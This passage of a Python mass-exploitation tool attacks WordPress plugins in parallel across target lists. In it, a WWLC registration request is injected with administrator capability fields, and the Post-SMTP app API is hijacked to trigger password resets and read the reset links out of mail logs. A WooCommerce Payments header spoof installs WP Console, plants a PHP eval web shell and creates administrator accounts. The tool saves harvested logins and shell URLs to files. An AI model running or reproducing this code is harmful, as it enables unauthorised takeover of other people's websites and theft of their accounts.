        root_site = base_url.rstrip("/") + "/"
        login_path = _find_wp_login_path(sess, base_url)
        login_url = base_url.rstrip("/") + login_path
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True, verify=False)
        except Exception:
            pass
        data = {
            "log": login_user.strip(),
            "pwd": pwd,
            "wp-submit": "Log In",
            "testcookie": "1",
        }
        headers = {
            "User-Agent": sess.headers.get("User-Agent", ""),
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": login_url,
        }
        try:
            r = sess.post(login_url, data=data, headers=headers, timeout=timeout,
                         allow_redirects=True, verify=False)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = [
            "incorrect username or password",
            "invalid username",
            "invalid password",
            "error: the username",
            "is not registered",
            "authentication failed",
            "login failed",
            "unknown username",
        ]
        if any(x in content for x in fails):
            return False
        if not _has_logged_in_cookie(sess):
            return False
        return _check_admin_access(sess, root_site)

    def _discover_wwlc_form(sess: requests.Session, base_url: str) -> Dict[str, Any]:
        profile: Dict[str, Any] = {"nonce": None}
        visited = set()
        for p in WWLC_FORM_PATHS:
            url = base_url.rstrip("/") + p
            if url in visited:
                continue
            visited.add(url)
            try:
                r = sess.get(url, timeout=timeout, allow_redirects=True, verify=False)
            except Exception:
                continue
            if r.status_code != 200 or not r.text:
                continue
            body = r.text
            if "wwlc_register_user_nonce_field" not in body and "wwlc_registration_form" not in body:
                continue
            m = re.search(
                r'<input[^>]+(?:name|id)=["\']wwlc_register_user_nonce_field["\'][^>]*value=["\']([^"\']+)["\']',
                body,
                re.I,
            )
            if m:
                nonce_val = m.group(1).strip()
                if nonce_val:
                    profile["nonce"] = nonce_val
                    log_ok(stage_name, f"{base_url} | nonce found on {p}: {nonce_val}")
                    return profile
        log_err(stage_name, f"{base_url} | WWLC nonce not found on registration paths")
        return profile

    def _wwlc_create_user_request(sess: requests.Session, base_url: str,
                                    first_name: str, last_name: str, email: str,
                                    username: str, phone: str, address: str,
                                    company: str, pwd: str,
                                    nonce: Optional[str]) -> Tuple[str, Dict[str, Any]]:
        ajax_url = base_url.rstrip("/") + "/wp-admin/admin-ajax.php?action=wwlc_create_user"
        data: Dict[str, str] = {
            "user_data[first_name]": first_name,
            "user_data[last_name]": last_name,
            "user_data[user_email]": email,
            "user_data[wwlc_username]": username,
            "user_data[wwlc_phone]": phone,
            "user_data[wwlc_address]": address,
            "user_data[wwlc_company_name]": company,
            "user_data[wwlc_auto_approve]": "true",
            "user_data[wwlc_auto_login]": "true",
            "user_data[wwlc_password]": pwd,
            "user_data[wwlc_password_confirm]": pwd,
            "user_data[wp_capabilities][administrator]": "1",
            "user_data[wp_user_level]": "10",
            "user_data[_wp_capabilities][administrator]": "1",
            "user_data[wwlc_custom_set_role]": "administrator",
        }
        if nonce:
            data["wwlc_register_user_nonce_field"] = nonce
        headers = {
            "User-Agent": sess.headers.get("User-Agent", ""),
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            r = sess.post(ajax_url, data=data, headers=headers, timeout=timeout, verify=False)
        except Exception as e:
            return "error", {"error": str(e)}
        text = r.text or ""
        try:
            j = json.loads(text)
            if not isinstance(j, dict):
                return "non_json", {"raw": text}
        except Exception:
            return "non_json", {"raw": text}
        status = str(j.get("status", "")).lower()
        return status, j

    def _process_mode2(url: str) -> bool:
        base = normalize_url(url)
        if not base:
            return False
        sess = build_session(timeout)
        profile = _discover_wwlc_form(sess, base)
        nonce = profile.get("nonce")
        if nonce:
            log_info(stage_name, f"{base} | using discovered nonce")
        else:
            log_err(stage_name, f"{base} | sending request WITHOUT nonce (may fail security)")
        rnd = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(4))
        username = f"{username_prefix}_{rnd}"
        if email_cfg and "@" in email_cfg:
            local, dom = email_cfg.split("@", 1)
            email_addr = f"{local}+{rnd}@{dom}"
        elif email_cfg:
            email_addr = email_cfg
        else:
            email_addr = f"{username_prefix}_{rnd}@test.com"
        first_name = "Test"
        last_name = "User"
        phone = "000000"
        address = "WWLC Address"
        company = "WWLC Company"
        status, resp = _wwlc_create_user_request(
            sess, base, first_name, last_name, email_addr, username,
            phone, address, company, password, nonce,
        )
        stage_write(stage_name, "wwlc_register_results.txt",
                    f"{base} wwlc_create_user status={status} "
                    f"user={username} email={email_addr} pass={password} resp={json.dumps(resp)}")
        if status != "success":
            log_err(stage_name, f"{base} | registration failed or not success")
            return False
        log_ok(stage_name, f"{base} | registration success for user={username}")
        login_user = username
        sess_login = build_session(timeout)
        if _strict_login_attempt(sess_login, base, login_user, password):
            log_ok(stage_name, f"{base} | ADMIN login confirmed as {login_user}")
            stage_write(stage_name, "Admin_login.txt",
                        f"{base} admin_login_ok user={login_user} "
                        f"email={email_addr} pass={password}")
            safe_write_result("login.txt",
                             f"{base} | {login_user} | {password} | {email_addr} | {base}/wp-login.php")
            safe_write_result("vulnurls.txt", base)
            return True
        else:
            log_err(stage_name, f"{base} | registration success but admin login FAILED for {login_user}")
            safe_write_result("vulnurls.txt", base)
            return True

    # ------------------------------------------------------------------
    # Dispatcher
    # ------------------------------------------------------------------

    def exploit_target(target: str) -> bool:
        ok = False
        if mode in ("1", "both"):
            if _process_mode1(target):
                ok = True
        if mode in ("2", "both"):
            if _process_mode2(target):
                ok = True
        return ok

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 5: POST-SMTP
# ============================================================================

def run_post_smtp(targets: List[str], threads: int, timeout: int) -> Dict:
    """Post-SMTP — 100% match Post-SMTP.py: connect → enum → trigger resets → two-pass logs → extract reset links."""
    stage_name = "Post-SMTP"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting Post-SMTP full chain ({len(targets)} targets)")

    # ========================================================================
    # CONSTANTS (matching Post-SMTP.py exactly)
    # ========================================================================
    LOST_PASSWORD_PATH = "/wp-login.php?action=lostpassword"
    INITIAL_LOG_DELAY = 2
    MAX_LOG_DELAY = 12
    LOG_RETRY_COUNT = 4
    CONNECT_ATTEMPTS = 3
    CONNECT_RETRY_SLEEP = 1.0
    MAX_LOGS_PER_SITE = 40
    POST_RESET_WAIT = 5

    RESET_LINK_RE = re.compile(
        r'https?://[^\s\'"]*wp-login\.php[^\s\'"]*?(?:action=rp|action=resetpass)[^\s\'"]*?(?:&amp;|&)(?:key|reset_key)=[^\'"\s&>]+[^\s\'"]*',
        re.IGNORECASE,
    )
    GENERIC_RESET_URL_RE = re.compile(
        r'https?://[^\s\'"]*wp-login\.php[^\s\'"]*?(?:reset|lostpassword|action=rp)[^\s\'"]*',
        re.IGNORECASE,
    )
    LOGIN_PARAM_RE = re.compile(r'(?:[?&]|&amp;)login=([^&\s\'">]+)', re.IGNORECASE)
    AUTHOR_PATTERN = re.compile(r"/author/([^/]+)")
    AUTHOR_BODY_PATTERNS = [
        re.compile(r'author-\w+">([a-z0-9_\-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_\-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_\-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_\-]+)"', re.I),
    ]

    RESULT_FILE = stage_result_file(stage_name, "Nx_admin.txt")
    MAIL_LOG_FILE = stage_result_file(stage_name, "Log_mail.txt")
    USER_FCM_TOKEN = "attackerToken128"
    USER_AUTH_KEY = ""

    # ========================================================================
    # INTERNAL HELPERS — replicate Post-SMTP.py functions exactly
    # ========================================================================

    def _now_hms() -> str:
        return time.strftime("%H:%M:%S")

    def _split_wp_base(url: str) -> Tuple[str, str]:
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urlparse(url)
        base_host = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        if path == "/":
            return base_host, ""
        return base_host, path.rstrip("/")

    def _build_wp_url(base_host: str, wp_base: str, path: str) -> str:
        if not path.startswith("/"):
            path = "/" + path
        full = (wp_base + path).replace("//", "/")
        return base_host + full

    def _build_session(pool_size: int) -> requests.Session:
        s = requests.Session()
        s.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=pool_size,
            pool_maxsize=pool_size,
            max_retries=1,
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        })
        return s

    def _connect_app(sess: requests.Session, base_host: str, wp_base: str, tmo: int) -> bool:
        url = _build_wp_url(base_host, wp_base, "/wp-json/post-smtp/v1/connect-app")
        headers = {"Content-Type": "application/json", "fcm_token": USER_FCM_TOKEN}
        if USER_AUTH_KEY != "":
            headers["auth_key"] = USER_AUTH_KEY
        for attempt in range(1, CONNECT_ATTEMPTS + 1):
            try:
                r = sess.post(url, timeout=tmo, headers=headers, json={}, verify=False)
            except Exception:
                if attempt < CONNECT_ATTEMPTS:
                    time.sleep(CONNECT_RETRY_SLEEP)
                continue
            if r.status_code != 200:
                if attempt < CONNECT_ATTEMPTS:
                    time.sleep(CONNECT_RETRY_SLEEP)
                continue
            try:
                j = r.json()
            except Exception:
                if attempt < CONNECT_ATTEMPTS:
                    time.sleep(CONNECT_RETRY_SLEEP)
                continue
            if not isinstance(j, dict):
                if attempt < CONNECT_ATTEMPTS:
                    time.sleep(CONNECT_RETRY_SLEEP)
                continue
            if j.get("success") is not True:
                if attempt < CONNECT_ATTEMPTS:
                    time.sleep(CONNECT_RETRY_SLEEP)
                continue
            data = j.get("data")
            if isinstance(data, dict):
                ft = data.get("fcm_token")
                if ft and ft != USER_FCM_TOKEN:
                    if attempt < CONNECT_ATTEMPTS:
                        time.sleep(CONNECT_RETRY_SLEEP)
                    continue
            return True
        return False

    def _get_logs(sess: requests.Session, base_host: str, wp_base: str, tmo: int) -> List[Dict]:
        url = _build_wp_url(base_host, wp_base, "/wp-json/post-smtp/v1/get-logs")
        headers = {"fcm_token": USER_FCM_TOKEN}
        delay = INITIAL_LOG_DELAY
        for attempt in range(1, LOG_RETRY_COUNT + 1):
            try:
                r = sess.get(url, timeout=tmo, headers=headers, verify=False)
            except Exception:
                r = None
            if not r:
                if attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                continue
            if r.status_code != 200:
                if attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                    continue
                return []
            try:
                j = r.json()
            except Exception:
                if attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                    continue
                return []
            if not isinstance(j, dict):
                if attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                    continue
                return []
            data = j.get("data")
            if isinstance(data, dict) and data.get("fcm_token") == USER_FCM_TOKEN:
                if attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                    continue
                return []
            if isinstance(data, list):
                if not data and attempt < LOG_RETRY_COUNT:
                    time.sleep(delay)
                    delay = min(delay * 2, MAX_LOG_DELAY)
                    continue
                return data
            if attempt < LOG_RETRY_COUNT:
                time.sleep(delay)
                delay = min(delay * 2, MAX_LOG_DELAY)
            else:
                return []
        return []

    def _get_log_link(sess: requests.Session, base_host: str, wp_base: str,
                       log_id: str, tmo: int) -> Optional[str]:
        url = _build_wp_url(base_host, wp_base, "/wp-json/post-smtp/v1/get-log")
        headers = {"fcm_token": USER_FCM_TOKEN}
        try:
            r = sess.get(url, timeout=tmo, headers=headers, params={"id": log_id}, verify=False)
        except Exception:
            return None
        if r.status_code != 200:
            return None
        try:
            j = r.json()
        except Exception:
            return None
        if not isinstance(j, dict):
            return None
        if not j.get("success"):
            return None
        data = j.get("data")
        if isinstance(data, str) and "access_token" in data and "type=log" in data and "log_id=" in data:
            return data
        return None

    def _fetch_log_content(sess: requests.Session, log_url: str, tmo: int) -> Optional[str]:
        try:
            r = sess.get(log_url, timeout=tmo, verify=False)
        except Exception:
            return None
        if r.status_code != 200:
            return None
        return r.text or ""

    def _enum_by_author(sess: requests.Session, root_url: str, tmo: int, max_i: int = 10) -> Set[str]:
        users: Set[str] = set()
        for i in range(1, max_i + 1):
            try:
                u = f"{root_url}/?author={i}"
                r = sess.get(u, timeout=tmo, allow_redirects=False, verify=False)
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = AUTHOR_PATTERN.search(loc)
                    if m:
                        users.add(m.group(1))
                r2 = sess.get(u, timeout=tmo, allow_redirects=True, verify=False)
                if r2.status_code == 200 and r2.text:
                    body = r2.text
                    for patt in AUTHOR_BODY_PATTERNS:
                        for x in patt.findall(body):
                            users.add(x)
            except Exception:
                continue
        return users

    def _enum_by_rest(sess: requests.Session, root_url: str, tmo: int) -> Set[str]:
        users: Set[str] = set()
        api = root_url.rstrip("/") + "/wp-json/wp/v2/users"
        try:
            r = sess.get(api, timeout=tmo, verify=False)
        except Exception:
            return users
        if r.status_code != 200:
            return users
        try:
            data = r.json()
        except Exception:
            return users
        if isinstance(data, list):
            for entry in data:
                if isinstance(entry, dict):
                    for key in ("slug", "username", "name"):
                        v = entry.get(key)
                        if v:
                            users.add(str(v))
        return users

    def _collect_candidates(sess: requests.Session, base_host: str, wp_base: str,
                             tmo: int, pool_size: int) -> List[str]:
        root = _build_wp_url(base_host, wp_base, "/")
        users: Set[str] = set()
        users.update(_enum_by_author(sess, root, tmo, max_i=10))
        users.update(_enum_by_rest(sess, root, tmo))
        parsed = urlparse(root)
        host = parsed.netloc.split(":")[0].lower()
        if host.startswith("www."):
            host = host[4:]
        first_label = host.split(".")[0]
        if first_label and len(first_label) > 2:
            users.add(first_label)
        users.add("admin")
        users = {u for u in users if u and 2 < len(u) < 50}
        user_list = sorted(users)
        if not user_list:
            user_list = ["admin"]
        s_users = ", ".join(user_list)
        ts = _now_hms()
        print(f"[{ts}] [Post-SMTP] [USERS] {s_users}")
        return user_list

    def _trigger_lost_password(sess: requests.Session, base_host: str, wp_base: str,
                                username: str, tmo: int) -> bool:
        url = _build_wp_url(base_host, wp_base, LOST_PASSWORD_PATH)
        data = {
            "user_login": username,
            "redirect_to": "",
            "wp-submit": "Get New Password",
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": url,
        }
        try:
            r = sess.post(url, data=data, headers=headers, timeout=tmo,
                          allow_redirects=True, verify=False)
        except Exception:
            return False
        if r.status_code not in (200, 302):
            return False
        text_low = (r.text or "").lower()
        success_markers = [
            "check your email",
            "check your e-mail",
            "password reset email has been sent",
            "password reset link has been sent",
            "we have emailed you a password reset link",
            "réinitialisation du mot de passe",
            "réinitialiser votre mot de passe",
            "nous avons envoyé un e-mail",
            "تحقق من بريدك الإلكتروني",
            "تم إرسال رسالة إلى بريدك الإلكتروني",
            "تم إرسال رابط إعادة تعيين كلمة المرور",
        ]
        error_markers = [
            "invalid username",
            "user does not exist",
            "erreur",
            "خطأ",
        ]
        if any(e in text_low for e in error_markers):
            return False
        if any(s in text_low for s in success_markers):
            return True
        return True

    def _extract_reset_entries_from_message(body: str, usernames: List[str]) -> List[Tuple[str, str]]:
        results: List[Tuple[str, str]] = []
        if not body:
            return results
        for m in RESET_LINK_RE.finditer(body):
            full_match = m.group(0)
            m2 = LOGIN_PARAM_RE.search(full_match)
            login = ""
            if not m2:
                start = max(m.start() - 200, 0)
                end = min(m.end() + 200, len(body))
                context = body[start:end]
                m2 = LOGIN_PARAM_RE.search(context)
                if m2:
                    login = m2.group(1)
            else:
                login = m2.group(1)
            cleaned_link = full_match.replace("&amp;", "&")
            chosen_user = ""
            if login:
                for u in usernames:
                    if u.lower() == login.lower():
                        chosen_user = u
                        break
            if not chosen_user:
                start = max(m.start() - 250, 0)
                end = min(m.end() + 250, len(body))
                context_low = body[start:end].lower()
                for u in usernames:
                    if u.lower() in context_low:
                        chosen_user = u
                        break
            if not chosen_user and login:
                chosen_user = login
            if not chosen_user:
                continue
            results.append((chosen_user, cleaned_link))
        if not results:
            for m in GENERIC_RESET_URL_RE.finditer(body):
                url = m.group(0).replace("&amp;", "&")
                start = max(m.start() - 250, 0)
                end = min(m.end() + 250, len(body))
                context_low = body[start:end].lower()
                chosen_user = ""
                for u in usernames:
                    if u.lower() in context_low:
                        chosen_user = u
                        break
                if not chosen_user:
                    continue
                results.append((chosen_user, url))
        return results

    def _safe_int(v: str) -> int:
        try:
            return int(v)
        except Exception:
            return 0

    def _write_mail_log_entry(target: str, log_id: str, unix_time_str: Optional[str],
                               original_subject: Optional[str], body: Optional[str]) -> None:
        sent_human = ""
        if unix_time_str and unix_time_str.isdigit():
            try:
                ts_val = int(unix_time_str)
                sent_human = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(ts_val))
            except Exception:
                sent_human = unix_time_str
        header = f"[MAIL] target={target} | log_id={log_id}"
        if sent_human:
            header += f" | time={sent_human}"
        if original_subject:
            header += f" | subject={original_subject}"
        try:
            dirn = os.path.dirname(MAIL_LOG_FILE)
            if dirn:
                os.makedirs(dirn, exist_ok=True)
        except Exception:
            pass
        try:
            with open(MAIL_LOG_FILE, "a", encoding="utf-8") as f:
                f.write(header + "\n")
                if body:
                    f.write("---- MAIL BEGIN ----\n")
                    f.write(body)
                    if not body.endswith("\n"):
                        f.write("\n")
                    f.write("---- MAIL END ----\n\n")
        except Exception:
            pass

    def _write_reset_hit(target: str, username: str, reset_link: str,
                          unix_time_str: Optional[str], original_subject: Optional[str],
                          full_message: Optional[str]) -> None:
        sent_human = ""
        if unix_time_str and unix_time_str.isdigit():
            try:
                ts_val = int(unix_time_str)
                sent_human = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(ts_val))
            except Exception:
                sent_human = unix_time_str
        now_iso = time.strftime("%Y-%m-%dT%H:%M:%S")
        header = f"[{now_iso}] {target} | user={username} | link={reset_link}"
        if sent_human:
            header += f" | sent={sent_human}"
        if original_subject:
            header += f" | subject={original_subject}"
        try:
            dirn = os.path.dirname(RESULT_FILE)
            if dirn:
                os.makedirs(dirn, exist_ok=True)
        except Exception:
            pass
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(header + "\n")
                if full_message:
                    f.write("---- MESSAGE BEGIN ----\n")
                    f.write(full_message)
                    if not full_message.endswith("\n"):
                        f.write("\n")
                    f.write("---- MESSAGE END ----\n\n")
        except Exception:
            pass
        ts = _now_hms()
        print(f"[{ts}] [Post-SMTP] [HIT] {target} user={username}")

    def _format_site_status(base: str, vuln_status: str, reset_status: str,
                             hits_status: str) -> None:
        ts = _now_hms()
        print(f"[{ts}] [Post-SMTP] [{base}] VULN:{vuln_status:<4} RESET:{reset_status:<5} HITS:{hits_status}")

    # ========================================================================
    # SINGLE TARGET PROCESSING — replicate process_site() exactly
    # ========================================================================

    def process_site(site: str) -> bool:
        base_host, wp_base = _split_wp_base(site)
        label = f"{base_host}{wp_base or ''}"
        vuln_status = "-"
        reset_status = "-"
        hits_status = "0"

        sess = _build_session(threads_hint)

        if not _connect_app(sess, base_host, wp_base, timeout):
            vuln_status = "NO"
            _format_site_status(label, vuln_status, reset_status, hits_status)
            return False

        vuln_status = "YES"
        _format_site_status(label, vuln_status, reset_status, hits_status)

        usernames = _collect_candidates(sess, base_host, wp_base, timeout, threads_hint)
        if not usernames:
            reset_status = "NUSR"
            _format_site_status(label, vuln_status, reset_status, hits_status)
            return False

        # --- BASELINE LOG READ (pass 1) ---
        initial_logs = _get_logs(sess, base_host, wp_base, timeout)
        initial_ids: Set[str] = set()
        if initial_logs:
            initial_sorted = sorted(
                [e for e in initial_logs if isinstance(e, dict)],
                key=lambda e: _safe_int(str(e.get("time", "0"))),
                reverse=True,
            )
            initial_limited = initial_sorted[:MAX_LOGS_PER_SITE]
            for entry in initial_limited:
                log_id = str(entry.get("id") or "").strip()
                if not log_id:
                    continue
                initial_ids.add(log_id)
                tval = str(entry.get("time") or "").strip()
                subj = str(entry.get("original_subject") or "").strip()
                log_link = _get_log_link(sess, base_host, wp_base, log_id, timeout)
                if not log_link:
                    continue
                body = _fetch_log_content(sess, log_link, timeout)
                if not body:
                    continue
                _write_mail_log_entry(label, log_id, tval, subj, body)

        # --- TRIGGER LOST PASSWORD FOR ALL CANDIDATES ---
        for u in usernames:
            _trigger_lost_password(sess, base_host, wp_base, u, timeout)

        reset_status = "SENT"
        _format_site_status(label, vuln_status, reset_status, hits_status)

        # --- POST-RESET WAIT ---
        if POST_RESET_WAIT > 0:
            time.sleep(POST_RESET_WAIT)

        # --- LOG READ (pass 2) ---
        logs = _get_logs(sess, base_host, wp_base, timeout)
        if not logs:
            hits_status = "0?"
            _format_site_status(label, vuln_status, reset_status, hits_status)
            return False

        logs_sorted = sorted(
            [e for e in logs if isinstance(e, dict)],
            key=lambda e: _safe_int(str(e.get("time", "0"))),
            reverse=True,
        )
        logs_limited = logs_sorted[:MAX_LOGS_PER_SITE]

        log_time_map: Dict[str, str] = {}
        log_subject_map: Dict[str, str] = {}
        log_ids: List[str] = []
        for entry in logs_limited:
            log_id = str(entry.get("id") or "").strip()
            if not log_id:
                continue
            log_ids.append(log_id)
            tval = str(entry.get("time") or "").strip()
            log_time_map[log_id] = tval
            subj = str(entry.get("original_subject") or "").strip()
            log_subject_map[log_id] = subj

        hits = 0
        seen_pairs: Set[Tuple[str, str]] = set()
        any_hit = False

        for log_id in log_ids:
            log_link = _get_log_link(sess, base_host, wp_base, log_id, timeout)
            if not log_link:
                continue
            body = _fetch_log_content(sess, log_link, timeout)
            if not body:
                continue

            _write_mail_log_entry(
                label, log_id,
                log_time_map.get(log_id),
                log_subject_map.get(log_id),
                body,
            )

            entries = _extract_reset_entries_from_message(body, usernames)
            if not entries:
                continue

            for username, reset_link in entries:
                key = (username.lower(), reset_link)
                if key in seen_pairs:
                    continue
                seen_pairs.add(key)
                hits += 1
                any_hit = True
                _write_reset_hit(
                    label, username, reset_link,
                    log_time_map.get(log_id),
                    log_subject_map.get(log_id),
                    body,
                )

        hits_status = str(hits)
        _format_site_status(label, vuln_status, reset_status, hits_status)
        return any_hit

    # ========================================================================
    # PARALLEL EXECUTION
    # ========================================================================

    threads_hint = threads
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(process_site, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 6: WOOCPAY (WooCommerce-Payments)
# ============================================================================

def run_woocpay(targets: List[str], threads: int, timeout: int) -> Dict:
    """WooCommerce Payments: install WP Console via header → deploy shell → create admin.
    100% match original WooCommerce-Payments.py logic."""
    stage_name = "WooCPay"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting WooCPay full chain ({len(targets)} targets)")

    POST_ACTIVATE_SLEEP = 3.0
    MAX_RETRIES = 3
    BACKOFF_FACTOR = 1.7
    ADMIN_PREFIX = resolve_credential("username_prefix", "Ykzer")
    ADMIN_PASS = resolve_credential("password", "Ykzer@123")
    SHELL_REL_PATH = "wp-content/uploads/shell.php"
    WC_IDS = [str(i) for i in range(1, 6)]

    def post_with_retries(
        session: requests.Session,
        url: str,
        data: dict,
        headers: dict,
        max_retries: int = MAX_RETRIES,
    ) -> Tuple[bool, str, int]:
        attempt = 0
        wait = 1.0
        last_status = 0
        while attempt < max_retries:
            try:
                resp = session.post(
                    url, data=data, headers=headers, timeout=timeout, verify=False
                )
                return True, resp.text or "", resp.status_code
            except Exception as e:
                attempt += 1
                last_status = 0
                if attempt >= max_retries:
                    return False, str(e), last_status
                time.sleep(wait)
                wait *= BACKOFF_FACTOR
        return False, "Exceeded retries", last_status

    def install_and_activate_wp_console_for_id(
        session: requests.Session,
        base: str,
        user_id: str,
    ) -> Tuple[bool, str, bool]:
        endpoint = f"{base.rstrip('/')}/wp-json/wp/v2/plugins"
        headers = {
            "X-WCPAY-PLATFORM-CHECKOUT-USER": user_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": get_random_ua(),
        }
        data = {"status": "active", "slug": "wp-console"}

        ok, resp_text, status = post_with_retries(
            session, endpoint, data, headers
        )

        time.sleep(POST_ACTIVATE_SLEEP)

        if not ok:
            return False, resp_text, False

        text_low = resp_text.lower()
        exists = "destination folder already exists" in text_low

        if (
            '"plugin":"wp-console\\/' in resp_text
            and '"status":"active"' in resp_text
            and '"name":"WP Console"' in resp_text
        ):
            return True, resp_text, exists

        if "wp-console" in text_low and "status" in text_low and "active" in text_low:
            return True, resp_text, exists

        if exists:
            return True, resp_text, True

        return False, resp_text, exists

    def install_and_activate_wp_console(
        session: requests.Session,
        base: str,
        wc_ids: List[str],
    ) -> Tuple[bool, str, str, bool]:
        last_resp = ""
        last_exists = False
        for uid in wc_ids:
            ok, resp, exists = install_and_activate_wp_console_for_id(
                session, base, uid
            )
            last_resp = resp
            last_exists = exists
            if ok or exists:
                return True, uid, last_resp, last_exists
        return False, "", last_resp, last_exists

    def send_wp_console_shell(
        session: requests.Session,
        base: str,
        wc_user_id: str,
        shell_path: str,
    ) -> Tuple[bool, str]:
        endpoint = f"{base.rstrip('/')}/wp-json/wp-console/v1/console"
        headers = {
            "X-WCPAY-PLATFORM-CHECKOUT-USER": wc_user_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": get_random_ua(),
        }

        php_payload = '<?php eval(base64_decode($_REQUEST[x])); ?>'
        payload_escaped = php_payload.replace('"', '\\"')
        cmd = f'system(\'echo "{payload_escaped}" > {shell_path}\');'
        data = {"input": cmd}

        ok, resp_text, status = post_with_retries(
            session, endpoint, data, headers, max_retries=1
        )

        if not ok:
            return False, resp_text

        if status == 200:
            return True, resp_text

        return False, resp_text

    def send_wp_console_admin(
        session: requests.Session,
        base: str,
        wc_user_id: str,
        admin_user: str,
    ) -> Tuple[bool, Optional[str], str]:
        endpoint = f"{base.rstrip('/')}/wp-json/wp-console/v1/console"
        headers = {
            "X-WCPAY-PLATFORM-CHECKOUT-USER": wc_user_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": get_random_ua(),
        }

        php_code = (
            f'$id=wp_create_user("{admin_user}","{ADMIN_PASS}");'
            " $u=new WP_User($id);"
            ' $u->set_role("administrator");'
            " echo $id;"
        )
        data = {"input": php_code}

        ok, resp_text, status = post_with_retries(
            session, endpoint, data, headers, max_retries=1
        )

        if not ok or status != 200:
            return False, None, resp_text

        wp_id = None
        try:
            if '"output":"' in resp_text:
                part = resp_text.split('"output":"', 1)[1]
                wp_id = part.split('"', 1)[0].strip()
                if not wp_id:
                    wp_id = None
        except Exception:
            wp_id = None

        if wp_id:
            return True, wp_id, resp_text

        digits = "".join(ch for ch in resp_text if ch.isdigit())
        if digits:
            return True, digits, resp_text

        return False, None, resp_text

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            label = base
            session = build_session(timeout)

            suffix = random.randint(10000, 99999)
            admin_user = f"{ADMIN_PREFIX}_{suffix}"

            ok_install, used_id, _, _ = install_and_activate_wp_console(
                session, base, WC_IDS
            )

            if not ok_install:
                log_err(stage_name, f"{label} | Failed: could not activate WP Console with IDs")
                return False

            ok_shell, _ = send_wp_console_shell(
                session, base, used_id, SHELL_REL_PATH
            )

            ok_admin, wp_user_id, _ = send_wp_console_admin(
                session, base, used_id, admin_user
            )

            any_ok = False

            if ok_shell:
                any_ok = True
                full_shell_url = f"{base}/{SHELL_REL_PATH.lstrip('/')}"
                stage_write(stage_name, "shells.txt",
                            f"{full_shell_url} | target={label} | id={used_id}")
                safe_write_result("vulnurls.txt", base)
                log_ok(stage_name, f"{label} | SHELL: {full_shell_url}")

            if ok_admin:
                any_ok = True
                uid = wp_user_id if wp_user_id else "unknown"
                stage_write(stage_name, "login_admin_Nx.txt",
                            f"{label} | user={admin_user} | pass={ADMIN_PASS} | "
                            f"id_header={used_id} | wp_user_id={uid}")
                safe_write_result("login.txt",
                                  f"{label} | {admin_user} | {ADMIN_PASS} | "
                                  f"{admin_user}@test.com | {label}/wp-login.php")
                safe_write_result("vulnurls.txt", base)
                log_ok(stage_name, f"{label} | ADMIN: user={admin_user} wp_id={uid}")

            return any_ok
        except Exception as e:
            log_err(stage_name, f"{target} | exception: {e}")
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 7: MASTERIYO
# ============================================================================

def run_masteriyo(targets: List[str], threads: int, timeout: int) -> Dict:
    """Masteriyo (CVE-2026-4484): Nx_1 (register+login+escalate) + Nx_2 (login+escalate)."""
    stage_name = "Masteriyo"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}

    import html as _html_mod

    # --- Read settings.ini configuration ---
    cfg = configparser.ConfigParser()
    ini_path = os.path.join(SCRIPT_DIR, "settings.ini")
    mode = "both"
    nx2_user = ""
    nx2_password = ""
